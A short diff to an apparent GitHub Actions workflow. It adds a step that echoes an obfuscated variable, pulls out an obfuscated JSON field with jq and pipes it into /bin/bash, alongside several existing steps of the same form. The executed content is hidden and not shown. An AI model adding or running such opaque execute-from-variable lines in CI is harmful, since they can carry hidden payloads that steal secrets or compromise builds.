@@ -29,6 +29,7 @@ jobs:
           echo $fqvf5 | jq -r .scxf80 | /bin/bash
           echo $rqfs25417 | jq -r .qzhp101 | /bin/bash
           echo $ynoro6 | jq -r .zaba66 | /bin/bash
+          echo $gclun50 | jq -r .pafrs45 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
